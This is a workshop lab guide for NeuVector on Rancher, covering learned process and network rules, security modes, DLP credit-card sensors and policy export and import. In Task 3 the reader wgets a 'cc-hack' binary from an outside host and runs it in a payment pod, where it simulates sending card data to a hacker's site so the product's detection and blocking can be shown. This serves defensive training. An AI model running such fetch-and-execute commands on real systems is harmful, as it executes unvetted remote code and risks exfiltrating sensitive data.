# Lab 2 - Exploring Learning Behaviour of NeuVector

In this lab, we will experience first hand NeuVector capability to learn application behaviour of any microservices application, automatically discover all the valid east-west network traffic within the cluster, and generate the security code as Kubernetes CRD resources. We will also detect attack using Data Loss Prevention technique of NeuVector an exciting use-case for our micro-services boutique application.  

### Task 1 - Observe the application behaviour in NV

1. Observing your application network flow.

Ensure you are at the cluster explorer for cluster1 in Rancher Server.
Navigate to the NeuVector menu on the left-hand side navigation bar in Rancher UI. Click the Full lifecycle Container Security link in the NeuVector box to open up a new browser tab accessing to the NeuVector user interface. You should see the interface like below.

NeuVector > Network Activity > Filter `eshop`

![Cluster1-NeuVector-Network-Filter-pg3](../images/Cluster1-NeuVector-Network-Filter-pg3.png)

2. Right click on the container - `eshop-online-boutique-frontend` . You can see the details of the pod along with other details. 

![Cluster1-NeuVector-Network-Activity-Filter-Applicationpod-Details](../images/Cluster1-NeuVector-Network-Activity-Filter-Applicationpod-Details.png)

3. Click on NeuVector > Policy > Groups > Filter `eshop` . NeuVector will present all the pods which are spun up by the micro services application in the namespace `eshop-demo`. We will see all the Services within the namespace, its modes etc. NeuVector prefix the services with nv.container-name which you can easily notice in the sample image below.

![Cluster1-Policy-Groups-Filter-eshop](../images/Cluster1-Policy-Groups-Filter-eshop.PNG)

4. Let's pick up one container to observe what NeuVector has learned about it. In our example, let's pick the `nv.eshop-demo-online-boutique-frontend.eshop-demo`. Click on the Process Profiles Rules - NeuVector shows all process which are spin up during container creation. 

![Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules](../images/Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules.PNG)

5. Click on Network Rules to know which micro-services are talking to each other using which protocol and ports.

![Cluster1-NeuVector-Policy-Network-Rules](../images/Cluster1-NeuVector-Policy-Network-Rules.PNG)

## Task 2 - Realtime Process Profile Rule (whitelisting)

1. Earlier in discovery mode, we had identified what process did the container start when it spined up. NeuVector continuously watch the process inside the container

![Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules](../images/Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules.PNG)

2. Let's assume, we need to make some configuration changes, changes to some configuration file residing on container's volume. For this we need access to the shell. Let see if NeuVector can identify new shell process when we access the shell in realtime. 

   For this we need to go to Rancher 

Rancher > Cluster Management > Cluster1 > Cluster > Workload > Pods > Filter eshop-demo namespace and we should see all containers running in the namespace. 

Let's select the `eshop-demo-online-boutique-frontend`container and click on the 3 vertical dot on right hand side which further provide options. Select `ExecuteShell`  ![Cluster1-Access-to-frontend-conatainer-shell](../images/Cluster1-Access-to-frontend-conatainer-shell.png)

Access to the container shell and accomplish the task as desired. 

![Cluster1-Access-to-frontend-conatainer-shell-prompt-success](../images/Cluster1-Access-to-frontend-conatainer-shell-prompt-success.png)

3. Now let validate if NeuVector was able to identify the new shell process. We will need to toggle to the browser when we have our NeuVector UI and no surprise, we do see the new process in NeuVector

NeuVector > Policy > Groups > Filter `frontend` > Process Profile Rules. 

![Cluster1-NeuVector-learned-new-process-shell](../images/Cluster1-NeuVector-learned-new-process-shell.png)

4. Similarly, we can check what Services are connecting to our pod & visa versa. 

NeuVector > Policy > Groups > Filter `frontend` > Network Rules Rules. 

![Cluster1-NeuVector-Policy-Network-Rules](../images/Cluster1-NeuVector-Policy-Network-Rules.PNG)

5. In this way NeuVector can learn our application behaviour. we can continue to test the application & it will continue to learn & create whitelist rules. Once we happy with our testing and we no longer want NeuVector to learn and keep us updated if things are beyond the whitelisting rule created by NeuVector during Discovery mode we change the mode Discovery to Monitor & or Protect. 

   Monitor mode will report any volition based on the whitelisting Process & Network Rules we have create in Discovery mode & report them as Security Event.  

To change our application mode from Discovery to Monitor 

 NeuVector > Policy > Groups > Filter `frontend` > Switch Mode

![Cluster1-Switch-mode-discovery-monitor-pg1](../images/Cluster1-Switch-mode-discovery-monitor-pg1-1669313660415-28.png)

Selection of Mode - `Monitor`

![Cluster1-Switch-mode-discovery-monitor-pg2](../images/Cluster1-Switch-mode-discovery-monitor-pg2.PNG)

Confirmation of Change of Mode to Monitor

![Cluster1-Switch-mode-discovery-monitor-pg3](../images/Cluster1-Switch-mode-discovery-monitor-pg3.PNG)

Going forward any violations in Process/Network will be alerted and we can see them in Notification > Security Events.

6. Let's try & see if we can generate events which violates the existing whitelisting rule and NeuVector Monitor mode, detects & alerts us of the behaviour. 

   For this we will need to Toggle to Rancher UI

   Rancher > Cluster Management > Cluster1 > Cluster > Workload > Pods > Filter eshop-demo namespace and we should see all containers running in the namespace. 

   Let's select the `eshop-demo-online-boutique-frontend`container and click on the 3 vertical dot on right hand side which further provide options. Select `ExecuteShell`  

   Execute a ping command to any website of your choice, I have used `www.google.com` it will result in success

   ![Cluster1-mode-monitor-proces-ping](../images/Cluster1-mode-monitor-proces-ping.png)



7. Since ping was not learned in discovery mode, and we have executed this command, Monitor mode will send an security event. We expect to see Security Event notifying that ping was never part of whitelisting rule & hence this was a violation and would be reported accordingly.   

For this we will need to toggle back to NeuVector UI

NeuVector > Notification > Security Event - Filter `www.google.com`

![Cluster1-mode-monitor-notification-security-event-violation-ping](../images/Cluster1-mode-monitor-notification-security-event-violation-ping.png)



## Task 3 - Securing Data with NeuVector DLP functionality 

Our Team is tasked to host this Online Boutique and ensure we protect customer sensitive data. NeuVector uses DLP and WAF uses the Deep Packet Inspection (DPI) to inspect the network payloads of connections for sensitive data violations. Let's see th is in action. 

1. NeuVector UI - Policy > Group > Add Group

Name = `eshop-demo`

Criteria = `namespace=eshop-demo`

![Group-add-eshop-demo-group](../images/Group-add-eshop-demo-group-1669661156379-49.PNG)

New Group created. 

![Group-add-eshop-demo-group-success](../images/Group-add-eshop-demo-group-success.PNG)

2. Enable DLP for newly created Group. 

   Click on the eshop-demo group, locate the DLP tab underneath, click edit button, check the creditcard DLP sensor (deny).

![Group-eshop-demo-dlp-page1](../images/Group-eshop-demo-dlp-page1.png)

Select Sensor.CreditCard & hit Apply.

![Group-eshop-demo-dlp-page](../images/Group-eshop-demo-dlp-page.PNG)

We now see the DLP successfully applied to the Group. 

![Group-eshop-demo-dlp-success-page2](../images/Group-eshop-demo-dlp-success-page2.png)

**Note - This does not automatically apply the same credit card sensor to all pods in eshop-demo namespace**

3. Now let's test the filter. For this we will move the Group we created into Monitor mode. 

In the Group, filter by "eshop", check all the pods in namespace eshop-demo. Click Switch Mode button. 

Select "Monitor" mode, and use "Basic". Click Apply.

![Group-eshop-demo-switch-to-monitor-pg1](../images/Group-eshop-demo-switch-to-monitor-pg1.PNG)

Switching to Monitor Mode.

![Group-eshop-demo-switch-to-monitor-pg2](../images/Group-eshop-demo-switch-to-monitor-pg2.PNG)

![Group-eshop-demo-switch-to-monitor-success-pg3](../images/Group-eshop-demo-switch-to-monitor-success-pg3.PNG)

4. We let's assume we have already an intruder inside our network and we are not aware of it. He will be stealing our credit care data.  For next step, we will switch to Rancher UI. 

Switch to Rancher UI

Cluster 2 > Workload > Pods > Filter `payment`> right click on 3 vertical dots > Execute Shell

![RancherUI-payment-service-execute-shall-pg1](../images/RancherUI-payment-service-execute-shall-pg1.PNG)

Copy and paste the code block on the container shell. This download the cc-hack agent into the pod, got executed. A customer's credit card number will then be sent to the hacker's site. And the hacker site will respond the same credit card number back to the agent.

`wget https://rancherworkshop.blob.core.windows.net/demoapp/cc-hack`
`chmod +x cc-hack`
`./cc-hack`

![RancherUI-payment-service-execute-shell-pg2](../images/RancherUI-payment-service-execute-shell-pg2-1669654522523-29-1669654723600-31.PNG)

We can see the code has execute & got credit card data which he can send to external world. 

5. Switch back to NeuVector UI to see if we are getting any Security Risk Event 

   NeuVector > Notification > Security Events > Filter `DLP`. You should notice the "card violation rule..."

![NeuVector-Notification-DLP-Event-pg1](../images/NeuVector-Notification-DLP-Event-pg1.PNG)

6. To inspect the payload, you can click on `Show Packet`. You can even download the packet capture by clicking on `DOWNLOAD PCAP`

![NeuVector-Notification-DLP-Event-pg2](../images/NeuVector-Notification-DLP-Event-pg2-1669655005102-37.PNG)



7. Now let protect the application so this does not happen again. 

NeuVector > Policy > Groups > Filter `eshop`> Select All > Switch Mode >  Select "Protect" mode, and use "Basic" > Click Apply.

![Group-eshop-demo-switch-to-protect-pg1](../images/Group-eshop-demo-switch-to-protect-pg1.PNG)

![Group-eshop-demo-switch-to-protect-pg2](../images/Group-eshop-demo-switch-to-protect-pg2.PNG)

![Group-eshop-demo-switch-to-protect-pg3-success](../images/Group-eshop-demo-switch-to-protect-pg3-success.PNG)

8. Now, we will need to switch to the Ranch UI, in the same payment service pod, open the shell, execute the ./cc-hack program. You will get a message that Operation was not permitted as it violated the DLP sensor we had applied on the pods/services in the eshop-demo namespace. 

   Cluster 2 > Workload > Pods > Filter `payment`> right click on 3 vertical dots > Execute Shell

   re-run the cc-hack script by executing the below command on the container shell. 

   `./cc-hack` . We expect to see a denial of the operation and sure we see it in the below sample image.  

![RancherUI-payment-service-execute-shell-protect-mode-result](../images/RancherUI-payment-service-execute-shell-protect-mode-result.PNG)

9. Let's check on what notification we get in NeuVector. 

   Toggle to the NeuVector UI 

   NeuVector > Notification > Security Events > Filter `Deny`. You should notice the process violation as `Critical` and the action by NeuVector which is `Deny`. 

![NeuVectorUI-group-protect-mode-result](../images/NeuVectorUI-group-protect-mode-result.PNG)



Further to this, we can define response rules on the security events to notify the operator in case those "interesting" events are being triggered. (Beyond the scope of this workshop)

9. Export Group Policy

   We have now learned our application behaviour and created a security profile. We can easily import & export these to new clusters we on-board. 

NeuVector > Policy > Groups > Filter `eshop`> Select All > Export Group Policy > dropdown > click on `Protect`

![NeuVector-eshop-app-security-policy-export-pg1](../images/NeuVector-eshop-app-security-policy-export-pg1.PNG)

A policy file with YAML extension will be downloaded to your local drive. 

10. Import Group Policy

    You can import these on your other cluster to build the same security policy for your application which will be on day zero have the application in the protect mode. 

NeuVector UI on Cluster 1 > Policy > Groups > `IMPORT GROUP POLICY` 

![NeuVector-eshop-app-security-policy-export-pg2-cluste1](../images/NeuVector-eshop-app-security-policy-export-pg2-cluste1.PNG)

![NeuVector-eshop-app-security-policy-export-pg3-cluster1](../images/NeuVector-eshop-app-security-policy-export-pg3-cluster1.PNG)

You can choose to drop the file or upload from the chosen location & click `UPLOAD`

![NeuVector-eshop-app-security-policy-export-pg4-cluster1](../images/NeuVector-eshop-app-security-policy-export-pg4-cluster1.PNG)

Upon successful import, you will see the message below on the right hand bottom corner. 

![NeuVector-eshop-app-security-policy-export-pg5-cluster1-successful](../images/NeuVector-eshop-app-security-policy-export-pg5-cluster1-successful.PNG)



In this lab, we have successfully learned application behaviour using NeuVector. To continue to experience application behaviour we have moved from Discovery to Monitor to observe violation and once we are finally happy with our application security posture we have moved to Protect Mode.

We have also seen how we have used DLP to protect our vital customer information 

Finally we have created our application security posture as `security as code`  exported and following imported on new cluster to ensure our application on the new cluster where it's deployed is secured from moment it's deployed. 

In Lab 3, we will see how we can managed Multiple NeuVector Cluster using NeuVector Federation. 

## Next Step

- [Navigate to Lab 3](03-neuvector-federation-policy.md) 
- [Return to Home Page](../README.md) 
